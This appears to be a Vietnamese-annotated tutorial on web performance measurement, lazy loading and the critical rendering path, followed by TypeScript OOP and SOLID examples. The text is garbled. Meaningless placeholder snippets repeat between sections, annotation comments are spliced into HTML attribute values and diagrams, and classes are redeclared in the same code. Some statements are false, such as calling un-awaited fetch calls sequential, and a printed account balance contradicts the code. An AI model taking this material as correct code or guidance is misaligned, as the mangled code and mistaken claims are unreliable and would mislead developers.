 // Chú giải: Network metrics
    dns: perfData.domainLookupEnd - perfData.domainLookupStart,
    tcp: perfData.connectEnd - perfData.connectStart,
    request: perfData.responseStart - perfData.requestStart,
    response: perfData.responseEnd - perfData.responseStart,

 // Chú giải: Parsing metrics
    domParse: perfData.domInteractive - perfData.domLoading,
    domReady: perfData.domContentLoadedEventEnd - perfData.navigationStart,
    load: perfData.loadEventEnd - perfData.navigationStart,

 // Chú giải: Web Vitals (approximate)
    fcp: navigation.responseStart - navigation.fetchStart,
    lcp: 0, // Cần dùng PerformanceObserver
  };
}

 // Chú giải: Observe LCP (Largest Contentful Paint)
const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1] as PerformanceEntry & {
    renderTime: number;
  };

  console.log('LCP:', lastEntry.renderTime || lastEntry.startTime);
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });

 // Chú giải: Log metrics after page load
window.addEventListener('load', () => {
  setTimeout(() => {
    const metrics = measurePerformance();
    console.table(metrics);

    /* Example output:
    ┌───────────┬────────┐
    │  Metric   │ Time   │
    ├───────────┼────────┤
    │ dns       │ 45ms   │
    │ tcp       │ 123ms  │
    │ request   │ 87ms   │
    │ response  │ 234ms  │
    │ domParse  │ 456ms  │
    │ domReady  │ 789ms  │
    │ load      │ 1234ms │
    │ fcp       │ 567ms  │
    └───────────┴────────┘
    */
  }, 0);
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Load tất cả chart libraries upfront
import { Chart } from 'chart.js'; // Chú giải: 200KB
import { TradingView } from 'tradingview'; // Chú giải: 500KB
import { DataGrid } from 'ag-grid'; // Chú giải: 300KB

class TradingApp {
  async init() {
 // Chú giải: Load all libs → 1000KB → 3-5s load time!
    this.chart = new Chart();
    this.tradingView = new TradingView();
    this.grid = new DataGrid();
  }
}

 // Chú giải: ✅ GOOD: Code splitting + Lazy loading
class TradingAppOptimized {
  private chart?: any;
  private tradingView?: any;
  private grid?: any;

  async init() {
 // Chú giải: Load critical UI first (header, sidebar)
    this.renderCriticalUI();

 // Chú giải: Lazy load chart when needed
    this.loadChartLazy();
  }

  renderCriticalUI() {
 // Chú giải: Inline critical CSS
    document.head.insertAdjacentHTML(
      'beforeend',
      `
      <style>
        .header { /* critical styles */ }
        .sidebar { /* critical styles */ }
      </style>
    `
    );

 // Chú giải: Render skeleton UI immediately
    document.body.innerHTML = `
      <div class="header">Trading Platform</div>
      <div class="sidebar">Menu...</div>
      <div id="chart-container">
        <div class="skeleton-loader"></div>
      </div>
    `;
  }

  async loadChartLazy() {
 // Chú giải: Dynamic import: chỉ load khi cần
    const { Chart } = await import(
      /* webpackChunkName: "chart" */
      /* webpackPrefetch: true */
      'chart.js'
    );

    this.chart = new Chart();
    this.renderChart();
  }

 // Chú giải: Lazy load trading view chỉ khi user click tab
  async loadTradingView() {
    if (!this.tradingView) {
      const { TradingView } = await import('tradingview');
      this.tradingView = new TradingView();
    }
    return this.tradingView;
  }
}

// Resource hints để pre-load chunks
document.head.insertAdjacentHTML(
  'beforeend',
  `
  <link rel="prefetch" href="/chunks/chart.js">
  <link rel="preload" as="script" href="/critical.js">
`
);

/*
📊 Kết quả:
❌ BAD:
- Bundle size: 1000KB
- FCP: 3-5s
- TTI: 5-7s

✅ GOOD:
- Initial bundle: 100KB
- FCP: 500ms-1s
- TTI: 1-2s
- Load chart.js khi cần: +200ms
*/

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ DO: Optimize Critical Rendering Path

 // Chú giải: 1. Minimize Critical Resources
 // Chú giải: - Inline critical CSS (above-the-fold)
 // Chú giải: - Defer non-critical CSS
 // Chú giải: - Async/defer non-critical JS

 // Chú giải: 2. Reduce Number of Critical Bytes
 // Chú giải: - Minify HTML/CSS/JS
 // Chú giải: - Compress with Gzip/Brotli
 // Chú giải: - Remove unused code (tree-shaking)

 // Chú giải: 3. Optimize Critical Path Length
 // Chú giải: - Reduce redirects
 // Chú giải: - Use CDN
 // Chú giải: - HTTP/2 multiplexing
 // Chú giải: - Preconnect to required origins

 // Chú giải: 4. Resource Hints
<link rel="dns-prefetch" href=" // Chú giải: api.example.com">
<link rel="preconnect" href=" // Chú giải: cdn.example.com">
<link rel="prefetch" href="/next-page.js">
<link rel="preload" as="script" href="/critical.js">

 // Chú giải: 5. Code Splitting
const ChartComponent = lazy(() => import('./Chart'));

 // Chú giải: 6. Image Optimization
<img
  src="image.webp"
  loading="lazy"
  decoding="async"
  srcset="small.webp 400w, large.webp 1200w"
>

 // Chú giải: 7. Service Worker for Caching
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

 // Chú giải: 8. Measure & Monitor
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('LCP:', entry.renderTime || entry.startTime);

 // Chú giải: Send to analytics
    sendToAnalytics({
      metric: 'lcp',
      value: entry.renderTime || entry.startTime,
      url: window.location.href
    });
  }
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ MISTAKE 1: Render-blocking CSS
<link rel="stylesheet" href="styles.css">
// Browser phải download + parse CSS trước khi render bất cứ gì!

 // Chú giải: ✅ FIX: Inline critical CSS, defer rest
<style>/* inline critical CSS */</style>
<link rel="preload" as="style" href="styles.css"
      onload="this.rel='stylesheet'">

 // Chú giải: ❌ MISTAKE 2: Parser-blocking scripts
<script src="app.js"></script>
// Chặn HTML parsing!

 // Chú giải: ✅ FIX: Defer scripts
<script src="app.js" defer></script>

// ❌ MISTAKE 3: Không optimize images
<img src="huge-image.jpg"> <!-- 5MB image! -->

 // Chú giải: ✅ FIX: Responsive images + lazy loading
<img
  src="small.webp"
  srcset="small.webp 400w, large.webp 1200w"
  sizes="(max-width: 600px) 400px, 1200px"
  loading="lazy"
  decoding="async"
>

// ❌ MISTAKE 4: Quá nhiều synchronous requests
fetch('/api/user');
fetch('/api/orders');
fetch('/api/positions');
 // Chú giải: Sequential → ~3s total

 // Chú giải: ✅ FIX: Parallel requests
Promise.all([
  fetch('/api/user'),
  fetch('/api/orders'),
  fetch('/api/positions')
]);
 // Chú giải: Parallel → ~1s total

 // Chú giải: ❌ MISTAKE 5: Layout thrashing
for (let i = 0; i < 100; i++) {
  const height = element.offsetHeight; // Chú giải: Read (trigger layout)
  element.style.height = height + 10 + 'px'; // Chú giải: Write (trigger reflow)
}
 // Chú giải: 100 reflows! Rất chậm!

 // Chú giải: ✅ FIX: Batch reads/writes
const heights = [];
for (let i = 0; i < 100; i++) {
  heights.push(element.offsetHeight); // Chú giải: Read all
}
for (let i = 0; i < 100; i++) {
  element.style.height = heights[i] + 10 + 'px'; // Chú giải: Write all
}
 // Chú giải: Chỉ 1 reflow!

// ❌ MISTAKE 6: Không measure performance
// Làm sao biết optimize có hiệu quả?

 // Chú giải: ✅ FIX: Monitor Web Vitals
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

getCLS(console.log);
getFID(console.log);
getFCP(console.log);
getLCP(console.log);
getTTFB(console.log);

```js
// Ví dụ rút gọn
const example = 42;
```

1. DNS Lookup       → Resolve domain → IP
2. TCP Handshake    → Establish connection (SYN, SYN-ACK, ACK)
3. TLS Handshake    → Secure connection (HTTPS)
4. HTTP Request     → Browser → Server
5. Server Process   → Generate response
6. HTTP Response    → Server → Browser (HTML)
7. HTML Parse       → DOM Tree
8. CSS Parse        → CSSOM Tree
9. JS Execution     → Modify DOM/CSSOM (nếu có)
10. Render Tree     → DOM + CSSOM = Render Tree
11. Layout          → Tính toán vị trí & kích thước
12. Paint+Composite → Vẽ pixels lên màn hình → ✅ USER SEES UI!

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────┐
│              OOP Concepts Flow                           │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. CLASS DEFINITION (Blueprint)                        │
│  ┌─────────────────────────────────────┐                │
│  │ class User {                        │                │
│  │   #password // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài. Trường private bắt đầu bằng `#` chỉ có thể truy cập trong class, gây lỗi khi truy cập ngoài.
│  │   constructor(name) { ... }        │                │
│  │   login() { ... }                  │                │
│  │ }                                   │                │
│  └─────────────────────────────────────┘                │
│               ↓                                          │
│  2. INSTANTIATION (Create object)                       │
│  ┌─────────────────────────────────────┐                │
│  │ const user = new User('John')       │                │
│  │ user.login() // Chú giải: Call method        │                │
│  └─────────────────────────────────────┘                │
│               ↓                                          │
│  3. INHERITANCE (Reuse code)                            │
│  ┌─────────────────────────────────────┐                │
│  │ class Admin extends User {          │                │
│  │   deleteUser() { ... }              │                │
│  │ }                                   │                │
│  └─────────────────────────────────────┘                │
│               ↓                                          │
│  4. POLYMORPHISM (Override behavior)                    │
│  ┌─────────────────────────────────────┐                │
│  │ class Admin extends User {          │                │
│  │   login() { // Chú giải: Override             │                │
│  │     super.login()                   │                │
│  │     this.logAudit()                 │                │
│  │   }                                  │                │
│  │ }                                   │                │
│  └─────────────────────────────────────┘                │
│               ↓                                          │
│  5. COMPOSITION (Combine objects)                       │
│  ┌─────────────────────────────────────┐                │
│  │ class User {                        │                │
│  │   constructor(logger) {             │                │
│  │     this.logger = logger // Chú giải: Inject │                │
│  │   }                                  │                │
│  │ }                                   │                │
│  └─────────────────────────────────────┘                │
└──────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     interface ILogger {
       log(message: string): void; // Chú giải: Contract
     }

     class Service {
       constructor(private logger: ILogger) {} // Chú giải: Type-safe
     }

     new Service(123); // ❌ Error: 123 không phải ILogger

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Production
     const service = new UserService(new RealLogger(), new RealEmailService());

 // Chú giải: Testing
     const service = new UserService(new MockLogger(), new MockEmailService());

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     class Animal {}
     class Mammal extends Animal {}
     class Carnivore extends Mammal {}
     class Feline extends Carnivore {}
     class Cat extends Feline {}
     class PersianCat extends Cat {} // QUÁ SÂU! 6 tầng

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     class UserService extends Logger {
       registerUser() {
         this.log('Registering...'); // Phụ thuộc vào Logger.log()
       }
     }

     // Nếu Logger.log() đổi signature → UserService break!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     class Counter {
       count = 0;
       increment() {
         this.count++;
       }
       incrementTwice() {
         this.increment();
         this.increment();
       }
     }

     class SpecialCounter extends Counter {
       increment() {
         super.increment();
         console.log('Incremented!'); // Chú giải: Log mỗi lần increment
       }
     }

     const counter = new SpecialCounter();
     counter.incrementTwice(); // Chú giải: Logs 2 lần (expected)

     // ❌ Nếu parent refactor incrementTwice():
 // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
     // → KHÔNG gọi increment() nữa → SpecialCounter KHÔNG log!

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     function User(name) {
       this.name = name;
       this.login = function () {
 // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
         console.log('Logging in...');
       };
     }

     const user1 = new User('A');
     const user2 = new User('B');
     // user1.login !== user2.login (2 copies khác nhau!)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     class User {
       constructor(name) {
         this.name = name;
       }
       login() {
         // ✅ Method trên prototype
         console.log('Logging in...');
       }
     }

     // Tất cả instances share 1 login() trên prototype
     // user1.login === user2.login (cùng 1 method!)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
     class A {
       method() {
         console.log('A');
       }
     }

     class B extends A {
       method() {
         super.method(); // Chú giải: Gọi A.method()
         console.log('B');
       }
     }

     class C extends B {
       method() {
         super.method(); // Chú giải: Gọi B.method() → gọi A.method()
         console.log('C');
       }
     }

     new C().method();
 // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
     // Phải trace qua 3 tầng để hiểu flow

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
  constructor(name) {
    super(name); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
    this.role = 'admin';
  }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ Inheritance: phụ thuộc parent
  class UserService extends Logger {}

 // Chú giải: ✅ Composition: inject dependency
  class UserService {
    constructor(private logger: Logger) {}
  }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// 1. BASIC CLASS WITH ENCAPSULATION (Đóng gói)
 // Chú giải: ============================================
// 🏦 Ví dụ: Tài khoản ngân hàng - ẩn số dư bên trong
class BankAccount {
  // 🔒 Private field: chỉ class này access được
  #balance: number = 0; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.

  constructor(
    public readonly accountNumber: string, // Số tài khoản (readonly: không sửa được)
    private owner: string // Chủ tài khoản (private: chỉ trong class)
  ) {
    // accountNumber là public → có thể đọc: account.accountNumber
    // owner là private → KHÔNG thể đọc từ bên ngoài: account.owner ❌
  }

  // 💰 Public method: gửi tiền (deposit = nạp tiền)
  deposit(amount: number): void {
    if (amount <= 0) throw new Error('Số tiền phải > 0');
    this.#balance += amount; // Cộng vào số dư
    console.log(`✅ Đã nạp ${amount}đ. Số dư: ${this.#balance}đ`);
  }

  // 💸 Public method: rút tiền (withdraw = rút)
  withdraw(amount: number): void {
    if (amount > this.#balance) {
      throw new Error('Số dư không đủ!');
    }
    this.#balance -= amount; // Chú giải: Trừ số dư
    console.log(`✅ Đã rút ${amount}đ. Còn lại: ${this.#balance}đ`);
  }

 // Chú giải: 📊 Public method: xem số dư (getBalance = lấy số dư)
  getBalance(): number {
    return this.#balance; // Chỉ đọc, không sửa được từ bên ngoài
  }
}

 // Chú giải: 🎯 Sử dụng class
const account = new BankAccount('123456', 'Nguyễn Văn A');
account.deposit(1000); // ✅ Nạp 1000đ
console.log(account.getBalance()); // Chú giải: 1000
account.withdraw(300); // ✅ Rút 300đ

// ❌ KHÔNG thể truy cập trực tiếp private field
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài. Trường private bắt đầu bằng `#` chỉ có thể truy cập trong class, gây lỗi khi truy cập ngoài.
 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
console.log(account.accountNumber); // Chú giải: ✅ OK: '123456' (public readonly)

 // Chú giải: ============================================
// 2. INHERITANCE (Kế thừa) & POLYMORPHISM (Đa hình)
 // Chú giải: ============================================
// 💎 Tài khoản Premium: kế thừa BankAccount + thêm tính năng mới
class PremiumAccount extends BankAccount {
  private creditLimit: number; // Hạn mức tín dụng (credit limit)

  constructor(accountNumber: string, owner: string, creditLimit: number) {
    // ⬆️ super() BẮT BUỘC gọi TRƯỚC khi dùng 'this'
    super(accountNumber, owner); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
    this.creditLimit = creditLimit;
  }

  // 🔄 Override (ghi đè) method withdraw của parent (Polymorphism)
  withdraw(amount: number): void {
    // 💡 PremiumAccount có thể rút quá số dư nhờ credit limit
    const available = this.getBalance() + this.creditLimit;

    if (amount > available) {
      throw new Error(`Vượt hạn mức! Khả dụng: ${available}đ`);
    }

    // Rút số dư trước
    const balanceToWithdraw = Math.min(amount, this.getBalance());
    if (balanceToWithdraw > 0) {
      super.withdraw(balanceToWithdraw); // Chú giải: Gọi method của parent
    }

    // Nếu còn thiếu → dùng credit
    const creditUsed = amount - balanceToWithdraw;
    if (creditUsed > 0) {
      console.log(`💳 Sử dụng credit: ${creditUsed}đ`);
    }
  }

  // ➕ Method MỚI chỉ có ở PremiumAccount (không có ở BankAccount)
  getCreditInfo() {
    return {
      balance: this.getBalance(), // Số dư hiện tại
      creditLimit: this.creditLimit, // Hạn mức tín dụng
      available: this.getBalance() + this.creditLimit, // Chú giải: Tổng khả dụng
    };
  }
}

 // Chú giải: 🎯 Sử dụng inheritance
const premium = new PremiumAccount('789', 'Trần Thị B', 5000);
premium.deposit(2000); // ✅ Có method từ parent (BankAccount)
premium.withdraw(3000); // ✅ Override: rút quá số dư nhờ credit
console.log(premium.getCreditInfo()); // Chú giải: ✅ Method mới của PremiumAccount
 // Chú giải: Output: { balance: 0, creditLimit: 5000, available: 5000 }

// 📝 Giải thích Polymorphism:
// - BankAccount.withdraw() → chỉ rút trong số dư
// - PremiumAccount.withdraw() → rút cả credit limit (behavior khác)
// Cùng tên method nhưng hành vi khác nhau!

 // Chú giải: ============================================
 // Chú giải: 3. ABSTRACT CLASS (Lớp Trừu tượng) & INTERFACE
 // Chú giải: ============================================
// 📐 Abstract class: KHÔNG thể tạo instance trực tiếp, chỉ để kế thừa
abstract class PaymentMethod {
  constructor(public provider: string) {} // provider = nhà cung cấp (Visa, Mastercard, VNPay...)

  // 🔴 Abstract method: BẮT BUỘC implement ở subclass
  // Không có implementation (body) ở đây
  abstract processPayment(amount: number): Promise<boolean>;

  // ✅ Concrete method: có implementation, các subclass dùng chung
  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000; // Giới hạn 1 triệu
  }
}

// 📋 Interface: "hợp đồng" (contract) - class implement phải có đủ methods
interface IRefundable {
  refund(transactionId: string): Promise<void>; // Hoàn tiền
}

// 💳 Thanh toán thẻ tín dụng: extends abstract class + implements interface
class CreditCardPayment extends PaymentMethod implements IRefundable {
  constructor(
    provider: string, // Chú giải: VD: 'Visa', 'Mastercard'
    private cardNumber: string // Chú giải: Số thẻ
  ) {
    super(provider); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
  }

  // ✅ Implement abstract method (BẮT BUỘC)
  async processPayment(amount: number): Promise<boolean> {
    // Validate bằng method của parent
    if (!this.validateAmount(amount)) {
      console.log('❌ Số tiền không hợp lệ!');
      return false;
    }

    // Xử lý thanh toán thẻ
    console.log(`💳 Đang charge ${amount}đ vào thẻ ${this.cardNumber}...`);
 // Chú giải: Gọi API gateway (VNPay, Stripe...)
    return true;
  }

 // Chú giải: ✅ Implement interface IRefundable
  async refund(transactionId: string): Promise<void> {
    console.log(`💰 Đang hoàn tiền giao dịch ${transactionId}...`);
    // Logic hoàn tiền...
  }
}

// 🏦 Chuyển khoản ngân hàng: chỉ extends abstract class (KHÔNG implement IRefundable)
class BankTransferPayment extends PaymentMethod {
  constructor(
    provider: string, // Chú giải: VD: 'VCB', 'ACB'
    private bankCode: string // Mã ngân hàng
  ) {
    super(provider);
  }

  // ✅ Implement abstract method (BẮT BUỘC)
  async processPayment(amount: number): Promise<boolean> {
    if (!this.validateAmount(amount)) return false;

    console.log(`🏦 Đang chuyển khoản ${amount}đ qua ${this.bankCode}...`);
    return true;
  }

  // ❌ KHÔNG có method refund() vì không implement IRefundable
  // (Chuyển khoản thường không hoàn tiền tự động)
}

 // Chú giải: 🎯 Sử dụng
const creditCard = new CreditCardPayment('Visa', '4111-1111-1111-1111');
await creditCard.processPayment(500_000); // ✅ Thanh toán
await creditCard.refund('TXN123'); // ✅ Hoàn tiền

const bankTransfer = new BankTransferPayment('VietcomBank', '970436');
await bankTransfer.processPayment(1_000_000); // ✅ Chuyển khoản
// await bankTransfer.refund('TXN456');      // ❌ Error: không có method refund()

 // Chú giải: ============================================
 // Chú giải: 4. COMPOSITION OVER INHERITANCE (TỐI ƯU NHẤT!)
 // Chú giải: ============================================
// ❌ BAD: Deep inheritance hierarchy (Cây kế thừa sâu - khó maintain)
class Animal {} // Động vật
class Mammal extends Animal {} // Động vật có vú
class Dog extends Mammal {} // Chó
class Labrador extends Dog {} // Chó Labrador - QUÁ SÂU! Khó hiểu và maintain

// 🤔 Vấn đề:
// - Nếu sửa Animal → ảnh hưởng tất cả classes con
// - Tight coupling: Labrador phụ thuộc vào Dog, Mammal, Animal
// - Khó test: phải setup cả chain

// ✅ GOOD: Composition pattern (Kết hợp - linh hoạt hơn)
// 📝 Định nghĩa interfaces (contracts)
interface ILogger {
  log(message: string): void; // Chú giải: Ghi log
}

interface IEmailService {
  sendEmail(to: string, subject: string): Promise<void>; // Chú giải: Gửi email
}

// 🔧 Implementations cụ thể
class ConsoleLogger implements ILogger {
  log(message: string): void {
    console.log(`[LOG] ${new Date().toISOString()}: ${message}`);
  }
}

class EmailService implements IEmailService {
  async sendEmail(to: string, subject: string): Promise<void> {
    console.log(`📧 Gửi email đến ${to}: ${subject}`);
 // Chú giải: Gọi API SendGrid, AWS SES, SMTP...
  }
}

// 🎯 UserService: COMPOSE (kết hợp) thay vì INHERIT (kế thừa)
// "Has-a" relationship thay vì "Is-a"
class UserService {
 // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
  constructor(
    private logger: ILogger, // Chú giải: UserService HAS-A logger
    private emailService: IEmailService // Chú giải: UserService HAS-A emailService
  ) {
    // ✅ Ưu điểm:
 // Chú giải: - Dễ swap implementation (ConsoleLogger → FileLogger)
 // Chú giải: - Dễ test (inject mock logger, mock emailService)
    // - Loose coupling (không phụ thuộc concrete classes)
  }

  async registerUser(email: string, password: string): Promise<void> {
    this.logger.log(`🚀 Đang đăng ký user: ${email}`);

    // Logic đăng ký user...
 // Chú giải: 1. Validate email/password
 // Chú giải: 2. Hash password
    // 3. Lưu vào database

    // Gửi email chào mừng
    await this.emailService.sendEmail(email, 'Chào mừng bạn đến với nền tảng!');

    this.logger.log(`✅ User đã đăng ký thành công: ${email}`);
  }
}

 // Chú giải: 🎯 Sử dụng Dependency Injection
const userService = new UserService(
  new ConsoleLogger(), // Chú giải: Inject logger implementation
  new EmailService() // Chú giải: Inject email implementation
);

await userService.registerUser('user@example.com', 'password123');

// 💡 Dễ dàng thay đổi implementation:
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi vào file thay vì console
  }
}

const userServiceWithFileLog = new UserService(
  new FileLogger(), // ✅ Swap logger → không cần sửa UserService!
  new EmailService()
);

// 🧪 Dễ dàng test với mocks:
class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // Lưu logs để verify
  }
}

class MockEmailService implements IEmailService {
  sentEmails: Array<{ to: string; subject: string }> = [];
  async sendEmail(to: string, subject: string): Promise<void> {
    this.sentEmails.push({ to, subject }); // Lưu emails để verify
  }
}

const mockLogger = new MockLogger();
const mockEmailService = new MockEmailService();
const testService = new UserService(mockLogger, mockEmailService);

await testService.registerUser('test@example.com', 'pass');
console.log(mockLogger.logs); // Chú giải: Verify logs
console.log(mockEmailService.sentEmails); // Chú giải: Verify emails sent

 // Chú giải: ============================================
// 5. SOLID PRINCIPLES IN ACTION (Các Nguyên Tắc SOLID)
 // Chú giải: ============================================

// 📐 S - Single Responsibility Principle (Nguyên tắc Trách nhiệm Đơn)
// "Mỗi class chỉ làm 1 việc duy nhất"

// ❌ BAD: God class - làm quá nhiều việc
class UserManager {
  validateEmail(email: string): boolean {
    /* ... */
  } // Chú giải: 1. Validate
  hashPassword(password: string): string {
    /* ... */
  } // Chú giải: 2. Hash
  saveToDatabase(user: any): void {
    /* ... */
  } // Chú giải: 3. Database
  sendWelcomeEmail(email: string): void {
    /* ... */
  } // Chú giải: 4. Email
  logActivity(message: string): void {
    /* ... */
  } // Chú giải: 5. Logging
 // Chú giải: TOO MANY RESPONSIBILITIES!
}

// ✅ GOOD: Tách ra thành nhiều classes, mỗi class 1 trách nhiệm
class User {
 // Chú giải: Chỉ chứa data (entity/model)
  constructor(
    public id: string,
    public email: string,
    public password: string
  ) {}
}

class UserValidator {
  // CHỈ làm validate
  validate(user: User): boolean {
    return user.email.includes('@') && user.password.length >= 8;
  }
}

class UserRepository {
  // CHỈ làm database operations
  async save(user: User): Promise<void> {
    console.log('💾 Lưu user vào database...');
 // Chú giải: Database logic: INSERT INTO users...
  }

  async findById(id: string): Promise<User | null> {
    console.log(`🔍 Tìm user theo ID: ${id}`);
 // Chú giải: Database logic: SELECT * FROM users WHERE id = ?
    return null;
  }
}

// 💡 Lợi ích:
// - Dễ hiểu: đọc tên class là biết làm gì
 // Chú giải: - Dễ maintain: sửa validation → chỉ sửa UserValidator
// - Dễ test: test từng class riêng biệt
// - Dễ reuse: UserValidator có thể dùng cho nhiều nơi

// 📐 O - Open/Closed Principle (Nguyên tắc Mở-Đóng)
// "Mở cho mở rộng (extension), đóng cho sửa đổi (modification)"

// ❌ BAD: Phải sửa code mỗi khi thêm discount type mới
class DiscountCalculator {
  calculate(price: number, type: string, value: number): number {
    if (type === 'percentage') {
      return price * (1 - value / 100);
    } else if (type === 'fixed') {
      return price - value;
    } else if (type === 'bogo') {
      // Thêm type mới → PHẢI SỬA CODE
      return price / 2;
    }
    return price;
  }
}

// ✅ GOOD: Dùng abstract class + inheritance
abstract class Discount {
  abstract calculate(price: number): number; // Chú giải: Abstract method
}

// 1️⃣ Giảm giá theo %
class PercentageDiscount extends Discount {
  constructor(private percent: number) {
    super();
  }

  calculate(price: number): number {
    return price * (1 - this.percent / 100);
  }
}

// 2️⃣ Giảm giá cố định
class FixedDiscount extends Discount {
  constructor(private amount: number) {
    super();
  }

  calculate(price: number): number {
    return Math.max(0, price - this.amount);
  }
}

// 3️⃣ Mua 1 tặng 1 (Buy One Get One)
class BuyOneGetOne extends Discount {
  calculate(price: number): number {
    return price / 2;
  }
}

// 4️⃣ Thêm discount type MỚI → KHÔNG CẦN SỬA code cũ!
class SeasonalDiscount extends Discount {
  constructor(private multiplier: number) {
    super();
  }

  calculate(price: number): number {
    return price * this.multiplier;
  }
}

 // Chú giải: 🎯 Sử dụng
function applyDiscount(price: number, discount: Discount): number {
  return discount.calculate(price); // Chú giải: Polymorphism
}

const price = 100_000;
console.log(applyDiscount(price, new PercentageDiscount(20))); // Chú giải: 80,000
console.log(applyDiscount(price, new FixedDiscount(15_000))); // Chú giải: 85,000
console.log(applyDiscount(price, new BuyOneGetOne())); // Chú giải: 50,000
console.log(applyDiscount(price, new SeasonalDiscount(0.7))); // Chú giải: 70,000

// 💡 Lợi ích:
// - Thêm tính năng mới → chỉ cần thêm class mới
// - KHÔNG sửa code cũ → không risk break existing features
// - Tuân thủ Open/Closed: Open for extension, Closed for modification

// 📐 L - Liskov Substitution Principle (Nguyên tắc Thay thế Liskov)
// "Subclass phải thay thế được parent mà không làm break code"

 // Chú giải: ❌ BAD: Subclass vi phạm "contract" của parent
abstract class Bird {
  abstract fly(): void; // Tất cả birds đều fly
}

class Sparrow extends Bird {
  fly(): void {
    console.log('🐦 Chim sẻ bay!');
  }
}

class Penguin extends Bird {
  fly(): void {
    // ❌ Chim cánh cụt KHÔNG bay được!
    throw new Error('Penguins cannot fly!');
  }
}

function makeBirdFly(bird: Bird) {
  bird.fly(); // Expect tất cả birds đều fly
}

makeBirdFly(new Sparrow()); // Chú giải: ✅ OK
makeBirdFly(new Penguin()); // Chú giải: ❌ Error! Violate LSP

// ✅ GOOD: Subclass tuân thủ parent contract
abstract class PaymentMethod {
  abstract processPayment(amount: number): Promise<boolean>;

  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000;
  }
}

class CreditCardPayment extends PaymentMethod {
  constructor(private provider: string, private cardNumber: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`💳 Thanh toán ${amount}đ qua thẻ ${this.provider}`);
    return true; // ✅ Tuân thủ contract: return boolean
  }
}

class BankTransferPayment extends PaymentMethod {
  constructor(private bank: string, private bankCode: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`🏦 Chuyển khoản ${amount}đ qua ${this.bank}`);
    return true; // ✅ Tuân thủ contract: return boolean
  }
}

// 🎯 Function chấp nhận BẤT KỲ PaymentMethod nào
async function processPayment(method: PaymentMethod, amount: number) {
 // Chú giải: Works với TẤT CẢ subclasses → LSP satisfied
  if (method.validateAmount(amount)) {
    const success = await method.processPayment(amount);
    console.log(success ? '✅ Thành công' : '❌ Thất bại');
  }
}

// ✅ Cả 2 đều work perfect (Liskov Substitution)
await processPayment(new CreditCardPayment('Visa', '1234'), 100_000);
await processPayment(new BankTransferPayment('ACB', '970416'), 200_000);

// 💡 Lợi ích:
 // Chú giải: - Code predictable: subclass behave như parent
// - Safe refactoring: thay parent → subclass mà không break
// - Polymorphism đúng nghĩa: "nhiều hình dạng, cùng interface"

// 📐 I - Interface Segregation Principle (Nguyên tắc Tách Interface)
// "Nhiều interfaces nhỏ > 1 interface lớn"
// "Class chỉ implement methods cần thiết, không bị ép implement methods không dùng"

// ❌ BAD: Interface quá lớn, ép implement methods không cần
interface IFile {
  read(): string;
  write(data: string): void;
  delete(): void;
  compress(): void;
  encrypt(): void;
}

// ReadOnlyFile bị ép implement write/delete/compress/encrypt (không cần!)
class ReadOnlyFile implements IFile {
  read(): string {
    return 'file content';
  }

  write(data: string): void {
    throw new Error('Read-only!'); // ❌ Không cần nhưng phải implement
  }

  delete(): void {
    throw new Error('Cannot delete!'); // ❌ Không cần nhưng phải implement
  }

  compress(): void {
    throw new Error('Cannot compress!'); // ❌ Không cần nhưng phải implement
  }

  encrypt(): void {
    throw new Error('Cannot encrypt!'); // ❌ Không cần nhưng phải implement
  }
}

// ✅ GOOD: Tách thành nhiều interfaces nhỏ, focused
interface IReadable {
  read(): string;
}

interface IWritable {
  write(data: string): void;
}

interface IDeletable {
  delete(): void;
}

